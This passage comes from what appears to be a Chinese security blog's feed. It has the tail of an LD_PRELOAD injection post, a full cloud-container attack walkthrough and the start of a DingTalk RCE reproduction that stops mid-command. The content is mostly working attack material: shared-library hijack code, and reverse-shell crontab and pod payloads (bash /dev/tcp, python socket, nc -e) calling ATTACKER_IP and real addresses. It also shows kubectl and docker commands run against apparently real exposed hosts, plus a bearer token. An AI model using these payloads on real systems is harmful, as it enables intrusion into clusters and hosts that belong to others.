.&#x2F;hack.c -o hack.so  #由于对so有大小限制，这里才带-s参数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成一个so文件后，可以直接利用给出的poc.py发送。或者也可以利用BURP构造包来发送。</p><pre class="line-numbers language-none"><code class="language-none">python poc.py http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cgi-bin&#x2F;index hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果需要使用burp来构造包则需要注意一点就是保持文件描述符不被关闭，关闭选项上repeater的第一个update选项，同时修改包中的Content-Length长度，由于我的so是14384字节，这里改成15000.最后再用多余的字节填充到比15000多一些即可。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011831808.png" alt="image-20220701155215245"></p><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>通过上面这个漏洞的利用，可以看到使用了LD_PRELOAD这个环境变量，这个东西影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。</p><p>LD_PRELOAD环境变量相信都在PHP绕过<strong>disable_function</strong>函数的时候见过，就是利用劫持进行覆写相关的函数来执行恶意的so。</p><p>如果需要实现这种注入攻击的方式，则至少需要满足：</p><ol><li>能够上传自己的.so文件</li><li>能够控制环境变量的值（设置LD_PRELOAD变量），比如<strong>putenv</strong>函数</li></ol><p>如果还需要绕过disable_function，还需要一个外部功能的函数可以执行，常见的比如PHP的mail函数。</p><p>这里用一个编写的demo，比如我们想劫持&#x2F;usr&#x2F;bin&#x2F;grep命令，可以先查看ls的动态链接库文件，<code>readelf -Ws</code>来查看。</p><p><img src="file://E:\Typora%20File\typroa%E5%9B%BE%E5%83%8F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5\image-20220701163415305.png?lastModify=1656671436" alt="image-20220701163415305"></p><p>这里我们选用<code>strcpy@GLIBC_2.2.5 (3)</code>这个链接库。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;​void payload() &#123;    system(&quot;id&quot;);&#125;​char *strcpy(char *dest, const char *src) &#123;   &#x2F;&#x2F;需要搜索查看函数的原型    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123;        return 0;    &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者，这个<code>__attribute__((constructor))</code>的意思是先于main()函数调用 ，这种情况下大部分函数都可以劫持到。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;unistd.h&gt;​static void before(void) __attribute__((constructor));​static void before(void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;id&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><pre class="line-numbers language-none"><code class="language-none">gcc -s hack.c -fPIC -shared -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把这个so加入到环境变量中</p><pre class="line-numbers language-none"><code class="language-none">export LD_PRELOAD&#x3D;$PWD&#x2F;hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011830676.png" alt="image-20220701163438797"></p><p><strong>禁用</strong></p><p>使用gcc的-static参数可以把libc.so.6静态链入执行程序中。但这也就意味着你的程序不再支持动态链接。</p><p>参考文章：</p><p><a href="https://tttang.com/archive/1399/">https://tttang.com/archive/1399/</a></p><p><a href="https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw">https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw</a></p><p><a href="https://forum.butian.net/share/1493">https://forum.butian.net/share/1493</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;环境变量注入&quot;&gt;&lt;a href=&quot;#环境变量注入&quot; class=&quot;headerlink&quot; title=&quot;环境变量注入&quot;&gt;&lt;/a&gt;环境变量注入&lt;/h3&gt;&lt;p&gt;前两天看到一个ACTF的WP，由于没有参加，所以不太清楚题目，但是其中有一个gogogo的题目，利用的是环境
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>云容器安全</title>
    <link href="https://misakikata.github.io/2022/03/%E4%BA%91%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <id>https://misakikata.github.io/2022/03/云容器安全/</id>
    <published>2022-03-22T08:24:43.000Z</published>
    <updated>2022-03-22T08:27:56.463Z</updated>
    
    <content type="html"><![CDATA[<h3 id="云容器安全初识"><a href="#云容器安全初识" class="headerlink" title="云容器安全初识"></a>云容器安全初识</h3><h4 id="API-Server未授权访问"><a href="#API-Server未授权访问" class="headerlink" title="API Server未授权访问"></a>API Server未授权访问</h4><p>利用两个外部的环境：<a href="http://34.219.148.35:8080/">http://34.219.148.35:8080/</a>、<a href="http://212.193.88.186:8080/">http://212.193.88.186:8080/</a></p><p>API Server 默认会开启两个端口：<code>8080</code> 和 <code>6443</code>。<br>其中 8080 端口无需认证，应该仅用于测试。6443 端口需要认证，且有 TLS 保护。</p><pre class="line-numbers language-none"><code class="language-none">kubectl create clusterrolebinding system:anonymous --clusterrole&#x3D;cluster-admin --user&#x3D;system:anonymous   &#x2F;&#x2F;使6443 端口允许匿名用户<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接访问 8080 端口会返回可用的 API 列表，如：</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;paths&quot;: [    &quot;&#x2F;api&quot;,    &quot;&#x2F;api&#x2F;v1&quot;,    &quot;&#x2F;apis&quot;,    &quot;&#x2F;apis&#x2F;extensions&quot;,    &quot;&#x2F;apis&#x2F;extensions&#x2F;v1beta1&quot;,    &quot;&#x2F;healthz&quot;,    &quot;&#x2F;healthz&#x2F;ping&quot;,    &quot;&#x2F;logs&#x2F;&quot;,    &quot;&#x2F;metrics&quot;,    &quot;&#x2F;resetMetrics&quot;,    &quot;&#x2F;swagger-ui&#x2F;&quot;,    &quot;&#x2F;swaggerapi&#x2F;&quot;,    &quot;&#x2F;ui&#x2F;&quot;,    &quot;&#x2F;version&quot;  ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而直接访问 6443 端口会提示无权限：&#96;User “system:anonymous” cannot get at the cluster scope.</p><p>如果安装了dashboard，访问 <code>/ui</code> 会跳转到 <code>dashboard</code> 页面，可以创建、修改、删除容器，查看日志等。</p><p>Kubernetes 官方提供了一个命令行工具 <a href="https://kubernetes.io/docs/user-guide/kubectl-overview/">kubectl</a>。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 获得所有节点kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; get nodes&#x2F;&#x2F; 获得所有容器kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; get pods --all-namespaces&#x3D;true&#x2F;&#x2F; 在 myapp 容器获得一个交互式 shellkubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp --namespace&#x3D;default -it -- bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据 Kubernetes 文档中<a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">挂载节点目录</a>的例子，可以写一个 <code>myapp.yaml</code>，将节点的根目录挂载到容器的 <code>/mnt</code> 目录。</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1kind: Podmetadata:  name: myappspec:  containers:  - image: nginx    name: test-container    volumeMounts:    - mountPath: &#x2F;mnt      name: test-volume  volumes:  - name: test-volume    hostPath:      path: &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用 kubectl 创建容器：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 由 myapp.yaml 创建容器kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F;http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; create -f myapp.yaml​&#x2F;&#x2F; 等待容器创建完成&#x2F;&#x2F; 获得 myapp 的交互式 shellkubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp --namespace&#x3D;default -it -- bash​&#x2F;&#x2F; 向 crontab 写入反弹 shell 的定时任务echo -e &quot;* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888 0&gt;&amp;1\n&quot; &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;crontab​&#x2F;&#x2F; 也可以用 python 反弹 shellecho -e &quot;* * * * * root &#x2F;usr&#x2F;bin&#x2F;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;\n&quot; &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221613236.png" alt="image-20220311143128477"></p><p>如果不需要反弹shell，只需要在docker内执行命令的话</p><pre class="line-numbers language-none"><code class="language-none">kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp -it -- ls &#x2F;etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上使用的端口为8080，如果需要使用6443，则需要将”system:anonymous”用户绑定到”cluster-admin”用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令。</p><p><strong>使用shodan上的一个环境</strong>，<a href="https://34.209.45.207:6443/%E3%80%82">https://34.209.45.207:6443/。</a></p><p>查看pods：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods?limit&#x3D;500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221614321.png" alt="image-20220311160028406"></p><p>添加一个pods</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发送一段json数据</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;annotations&quot;:&#123;&quot;kubectl.kubernetes.io&#x2F;last-applied-configuration&quot;:&quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;kind\&quot;:\&quot;Pod\&quot;,\&quot;metadata\&quot;:&#123;\&quot;annotations\&quot;:&#123;&#125;,\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;namespace\&quot;:\&quot;default\&quot;&#125;,\&quot;spec\&quot;:&#123;\&quot;containers\&quot;:[&#123;\&quot;image\&quot;:\&quot;nginx:1.14.2\&quot;,\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;volumeMounts\&quot;:[&#123;\&quot;mountPath\&quot;:\&quot;&#x2F;host\&quot;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;],\&quot;volumes\&quot;:[&#123;\&quot;hostPath\&quot;:&#123;\&quot;path\&quot;:\&quot;&#x2F;\&quot;,\&quot;type\&quot;:\&quot;Directory\&quot;&#125;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;&#125;\n&quot;&#125;,&quot;name&quot;:&quot;test-4444&quot;,&quot;namespace&quot;:&quot;default&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test-4444&quot;,&quot;volumeMounts&quot;:[&#123;&quot;mountPath&quot;:&quot;&#x2F;host&quot;,&quot;name&quot;:&quot;host&quot;&#125;]&#125;],&quot;volumes&quot;:[&#123;&quot;hostPath&quot;:&#123;&quot;path&quot;:&quot;&#x2F;&quot;,&quot;type&quot;:&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221614134.png" alt="image-20220311162415147"></p><p>执行命令，</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;test-4444&#x2F;exec?stdout&#x3D;1&amp;stderr&#x3D;1&amp;tty&#x3D;true&amp;command&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示错误，对于websocket连接，首先进行http(s)调用，然后是使用HTTP Upgrade标头对websocket的升级请求。</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;kind&quot;: &quot;Status&quot;,  &quot;apiVersion&quot;: &quot;v1&quot;,  &quot;metadata&quot;: &#123;​  &#125;,  &quot;status&quot;: &quot;Failure&quot;,  &quot;message&quot;: &quot;Upgrade request required&quot;,  &quot;reason&quot;: &quot;BadRequest&quot;,  &quot;code&quot;: 400&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用wscat，地址：<a href="https://github.com/websockets/wscat/archive/refs/tags/3.0.0.zip">https://github.com/websockets/wscat/archive/refs/tags/3.0.0.zip</a></p><p>较新的版本只支持ws开头的协议，这里换个老点的版本</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;wscat -n -c &quot;https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;test-4444&#x2F;exec?stdout&#x3D;1&amp;stderr&#x3D;1&amp;tty&#x3D;true&amp;command&#x3D;id&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="利用yaml创建反弹shell"><a href="#利用yaml创建反弹shell" class="headerlink" title="利用yaml创建反弹shell"></a>利用yaml创建反弹shell</h4><p>前提需要容器逃逸，在控制节点上创建。</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: apps&#x2F;v1kind: DaemonSetmetadata:  name: kube-cache-node1  namespace: kube-systemspec:  selector:    matchLabels:      app: kube-cache-node1  template:    metadata:      labels:        app: kube-cache-node1    spec:      hostNetwork: true      hostPID: true      containers:      - name: main        image: bash        imagePullPolicy: IfNotPresent        command: [&quot;bash&quot;]        # reverse shell        args: [&quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ATTACKER_IP&#x2F;ATTACKER_PORT 0&gt;&amp;1&quot;]        securityContext:          privileged: true        volumeMounts:        - mountPath: &#x2F;host          name: host-root      volumes:      - name: host-root        hostPath:          path: &#x2F;          type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用容器逃逸后的shell在目标控制节点上将上述内容保存为<code>kiit.yaml</code>并执行：</p><pre class="line-numbers language-none"><code class="language-none">kubectl apply -f kiit.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Docker-Daemon服务暴露至公网"><a href="#Docker-Daemon服务暴露至公网" class="headerlink" title="Docker Daemon服务暴露至公网"></a>Docker Daemon服务暴露至公网</h4><p>Client上使用命令后，会发送对应的请求到API，也就是Docker Daemon服务。然后docker会去对应的Registry仓库拉取镜像创建容器。</p><p>这个服务本地会暴露在unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock上，如果容器中有权限访问到这个文件，就可以对宿主机的所有容器进行操作。</p><p>比如：<a href="http://68.183.144.186:2375/">http://68.183.144.186:2375/</a></p><p>直接访问，或者使用docker访问</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看docker下的镜像</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建容器，利用bash和crontab计划任务向宿主机写入shell:</p><p>centos系统挂载路径为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root；ubuntu系统为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root；</p><pre class="line-numbers language-none"><code class="language-none"># 查看宿主机可用镜像docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 image​# 启动刚刚创建的容器并连接docker -H tcp:&#x2F;&#x2F;51.195.28.76:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;51.195.28.76:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616072.png" alt="image-20220314143117085"></p><p>使用镜像来创建一个容器</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; dcf4d4bef137 &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动成功后，自动进入了这个容器内</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616073.png" alt="image-20220314143537187"></p><p>写入反弹shell</p><pre class="line-numbers language-none"><code class="language-none">root@177ac63fbb2f:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;158.247.216.146&#x2F;8899 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这个容器并没有启动，退出后会发现这个容器也停止了。需要先把这个容器启动运行。</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 ps -adocker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 start 8f351dbd41d7docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 exec -it --user root 8f351dbd41d7 &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616074.png" alt="image-20220314151745747"></p><p>或者使用python来执行，例如</p><pre class="line-numbers language-none"><code class="language-none">import docker​client &#x3D; docker.DockerClient(base_url&#x3D;&#39;http:&#x2F;&#x2F;192.168.11.160:2375&#x2F;&#39;)data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;*&#x2F;1 * * * * &#x2F;usr&#x2F;bin&#x2F;nc 192.168.11.1 21 -e &#x2F;bin&#x2F;sh&#39; &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root&quot; &#39;&#39;&#39;, remove&#x3D;True, volumes&#x3D;&#123;&#39;&#x2F;etc&#39;: &#123;&#39;bind&#39;: &#39;&#x2F;tmp&#x2F;etc&#39;, &#39;mode&#39;: &#39;rw&#39;&#125;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Kubelet-10250端口未授权访问"><a href="#Kubelet-10250端口未授权访问" class="headerlink" title="Kubelet 10250端口未授权访问"></a>Kubelet 10250端口未授权访问</h4><p>10250端口是kubelet API的HTTPS端口，该端口对外提供了Pod和Node的相关信息，如果该端口对公网暴露，并且关闭授权，则可能导致攻击。</p><pre class="line-numbers language-none"><code class="language-none">curl -k https:&#x2F;&#x2F;172.18.0.2:10250&#x2F;run&#x2F;&#123;namespace&#125;&#x2F;&#123;podName&#125;&#x2F;&#123;appName&#125; -d &quot;cmd&#x3D;whoami&quot;或：curl --insecure -v -H &quot;X-Stream-Protocol-Version: v2.channel.k8s.io&quot; -H &quot;X-Stream-Protocol-Version: channel.k8s.io&quot; -X POST &quot;https:&#x2F;&#x2F;kube-node-here:10250&#x2F;exec&#x2F;&lt;namespace&gt;&#x2F;&lt;podname&gt;&#x2F;&lt;container-name&gt;?command&#x3D;touch&amp;command&#x3D;hello_world&amp;input&#x3D;1&amp;output&#x3D;1&amp;tty&#x3D;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Kubernetes-Dashboard未授权访问"><a href="#Kubernetes-Dashboard未授权访问" class="headerlink" title="Kubernetes Dashboard未授权访问"></a>Kubernetes Dashboard未授权访问</h4><p>如果Kubernetes API Server配置了Dashboard,通过路径&#x2F;ui即可访问，直接访问部署一个docker即可</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1kind: Podmetadata:  name: testspec:  containers:  - name: busybox    image: busybox:1.29.2    command: [&quot;&#x2F;bin&#x2F;sh&quot;]    args: [&quot;-c&quot;, &quot;nc attacker 4444 -e &#x2F;bin&#x2F;sh&quot;]    volumeMounts:    - name: host      mountPath: &#x2F;host  volumes:  - name: host    hostPath:      path: &#x2F;      type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="k8s-serviceaccount-token-泄露"><a href="#k8s-serviceaccount-token-泄露" class="headerlink" title="k8s serviceaccount token 泄露"></a>k8s serviceaccount token 泄露</h4><p>由于k8s集群部署的时候默认会在每个<code>pod</code>容器中挂载token文件到<br><code>/run/secrets/kubernetes.io/serviceaccount/token</code></p><p>我们可以通过命令行工具 <code>kubectl</code>来对<code>api-server</code>进行操作。</p><p>创建一个<code>k8s.yaml</code>配置文件，如下，token处为我们上面拿到的token，server则填写 api-server的地址</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1clusters:- cluster:    insecure-skip-tls-verify: true    server: https:&#x2F;&#x2F;10.247.0.1  name: cluster-namecontexts:- context:    cluster: cluster-name    namespace: test    user: admin  name: admincurrent-context: adminkind: Configpreferences: &#123;&#125;users:- name: admin  user:    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行以下命令远程连接进入题目的k8s集群，成功通过认证。</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Etcd未授权访问"><a href="#Etcd未授权访问" class="headerlink" title="Etcd未授权访问"></a>Etcd未授权访问</h4><p>其默认监听了2379等端口，如果2379端口暴露到公网，可能造成敏感信息泄露。</p><p>首先在Kubernetes中可以更改配置&#x2F;etc&#x2F;Kubernetes&#x2F;manifests&#x2F;etcd.yaml文件的内容，来将2379端口向外暴露</p><p>Etcd v2和v3是两套不兼容的API，K8s是用的v3，所以需要先通过环境变量设置API为v3</p><pre class="line-numbers language-none"><code class="language-none">export ETCDCTL_API&#x3D;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出该目录所有节点的信息<br><a href="http://152.7.98.135:2379/v2/keys">http://152.7.98.135:2379/v2/keys</a></p><p>添加上recursive&#x3D;true参数,就会递归地列出所有的值<br><a href="http://152.7.98.135:2379/v2/keys/?recursive=true">http://152.7.98.135:2379/v2/keys/?recursive=true</a></p><p><a href="http://152.7.98.135:2379/v2/members">http://152.7.98.135:2379/v2/members</a> 集群中各个成员的信息</p><p>安装etcdctl，可以使用类似的方式查询API</p><pre class="line-numbers language-none"><code class="language-none">etcdctl --endpoint&#x3D;http:&#x2F;&#x2F;[etcd_server_ip]:2379 ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若存在路径&#x2F;registry&#x2F;secrets&#x2F;default，其中可能包含对集群提升权限的默认服务令牌。</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/4276">https://xz.aliyun.com/t/4276</a><br><a href="https://tttang.com/archive/1389/">https://tttang.com/archive/1389/</a><br><a href="https://www.freebuf.com/vuls/196993.html">https://www.freebuf.com/vuls/196993.html</a><br><a href="https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">https://annevi.cn/2020/12/21/%E5%8D%8E%E4%B8%BA%E4%BA%91ctf-cloud%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8Bk8s%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;云容器安全初识&quot;&gt;&lt;a href=&quot;#云容器安全初识&quot; class=&quot;headerlink&quot; title=&quot;云容器安全初识&quot;&gt;&lt;/a&gt;云容器安全初识&lt;/h3&gt;&lt;h4 id=&quot;API-Server未授权访问&quot;&gt;&lt;a href=&quot;#API-Server未授权访问&quot; c
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="https://misakikata.github.io/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>钉钉6.3.5RCE</title>
    <link href="https://misakikata.github.io/2022/02/%E9%92%89%E9%92%896-3-5RCE/"/>
    <id>https://misakikata.github.io/2022/02/钉钉6-3-5RCE/</id>
    <published>2022-02-16T10:08:43.000Z</published>
    <updated>2022-02-16T10:08:43.414Z</updated>
    
    <content type="html"><![CDATA[<h3 id="钉钉RCE"><a href="#钉钉RCE" class="headerlink" title="钉钉RCE"></a>钉钉RCE</h3><p>大佬的POC：<a href="https://github.com/crazy0x70/dingtalk-RCE">https://github.com/crazy0x70/dingtalk-RCE</a></p><p>复现：</p><p>本地开一个服务</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入：</p><pre class="line-numbers language-none"><code class="language-none">dingtalk:&#x2F;&#x2F;dingtalkclient&#x2F;page&#x2F;link?url&#x3D;http:&#x2F;&#x2F;192.168.230.207:8000&#x2F;1.html&amp;pc_slide&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807243.png" alt="image-20220216173101053"></p><p>测试还发现，这个POC只能在群组里触发，如果发给个人，比如我这里发给自己是不能触发的。</p><p>修改shellcode的：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 